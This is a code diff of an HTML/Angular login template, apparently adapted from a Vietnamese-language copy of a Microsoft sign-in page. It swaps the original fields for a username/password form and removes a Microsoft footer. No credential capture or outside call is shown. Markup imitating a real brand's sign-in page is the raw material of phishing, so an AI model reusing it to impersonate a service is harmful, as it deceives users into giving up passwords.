@@ -28,7 +28,7 @@
                     </picture>
                 </div>
 
-                <!-- ko ifnot: showSplitter -->
+
                 <div role="dialog" aria-labelledby="signInTitle" aria-describedby="signInDescription">
                     <div id="signInTitle" class="row text-title margin-bottom-16" aria-hidden="true"
                         data-bind="text: config.text.header" style="font-size: 1.5rem;
@@ -38,12 +38,11 @@
                          margin-bottom: 16px;
                         font-weight: 60px ; font-family: Arial, Helvetica, sans-serif">Đăng nhập
                     </div>
-                    <!-- ko if: context -->
-                    <!-- /ko -->
+
                     <div class="alert alert-error text-body margin-bottom-12 col-md-12" role="alert"
                         aria-live="assertive" aria-relevant="text" aria-atomic="true"
                         data-bind="visible: error, html: error" style="display: none;"></div>
-                    <div class="row margin-bottom-16">
+                    <!-- <div class="row margin-bottom-16">
                         <div class="form-group col-md-12 placeholderContainer">
                             <input type="email" class="form-control" placeholder="Email, điện thoại hoặc Skype"
                                 aria-required="true" aria-label="Email, điện thoại hoặc Skype" spellcheck="false"
@@ -56,12 +55,9 @@
                                     border-right-width: 0px;
                                     border-bottom-width: 1px;
                                     border-radius: 0px;">
-                            <!-- ko if: isRequestPending -->
-                            <!-- /ko -->
-                            <!-- ko if: showPlaceholder -->
-                            <!-- /ko -->
-                        </div>
-                        <div class="form-group col-md-12 placeholderContainer">
+
+                        </div> -->
+                    <!-- <div class="form-group col-md-12 placeholderContainer">
                             <input type="password" class="form-control" placeholder="Password" aria-required="true"
                                 aria-label="Email, điện thoại hoặc Skype" spellcheck="false" autocomplete="off"
                                 data-bind="hasFocus: focus, textInput: email,
@@ -72,6 +68,31 @@
                                     border-right-width: 0px;
                                     border-bottom-width: 1px;
                                     border-radius: 0px;">
+                        </div> -->
+                    <div class="a">
+                        <div class="b row">
+                            <div class="col-md-12">
+                                <div class="col-md-12">
+                                    <div class="">
+                                        <form action="/action_page.php" class="was-validated"
+                                            (ngSubmit)="onsubmit(signin);" #signin="ngForm">
+                                            <div class="form-group">
+                                                <input type="text" class="form-control" id="uname"
+                                                    placeholder="Username" name="uname" [(ngModel)]="uname" required>
+                                            </div>
+                                            <div class="form-group">
+                                                <input [type]="showpassword" class="form-control" id="email"
+                                                    placeholder="Password" name="pass" [(ngModel)]="pass" required>
+                                                <span toggle="#password-field"
+                                                    class="fas fa-fw field-icon toggle-password" style="color: olive"
+                                                    (click)="hello()">
+                                                    <b [ngClass]="{'fa-eye': anhien}"></b>
+                                                    <b [ngClass]="{'fa-eye-slash': hienan}"></b></span>
+                                            </div>
+                                        </form>
+                                    </div>
+                                </div>
+                            </div>
                         </div>
                     </div>
 
@@ -91,35 +112,14 @@
                     </div>
 
                 </div>
-                <div class="row inline-block no-margin-top-bottom button-container" style="
-                 margin-left: 200px;
-                 padding-top: 48px;
-                 color: #000;
-                 width: 108px; ">
-                    <input type="submit" class="btn btn-block btn-dark"
-                        data-bind="value: config.text.linkNext, click: submit" value="Tiếp theo">
+
+
+                <div class="form-group" style="padding-left: 220px;">
+                    <button type="submit" class="btn btn-warning" (click)="dangnhap();" [disabled]="signin.invalid">
+                        Đăng Nhập</button>
                 </div>
             </main>
         </div>
     </div>
     <br>
-
-    <!-- <footer id="footer" style="position: fixed;
-    bottom: 0px;
-    width: 100%;
-    overflow: visible;
-    z-index: 99;
-    clear: both;
-    text-align: right;
-    background-color: rgba(0,0,0,0.6);">
-        <div>
-            <div class="footerNode">
-                <span>©2019 Microsoft</span>
-                <a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}"
-                    href="#" data-url="https://go.microsoft.com/fwlink/?LinkId=521839">Điều khoản về quyền riêng
-                    tư</a>
-            </div>
-        </div>
-    </footer> -->
-
 </body>
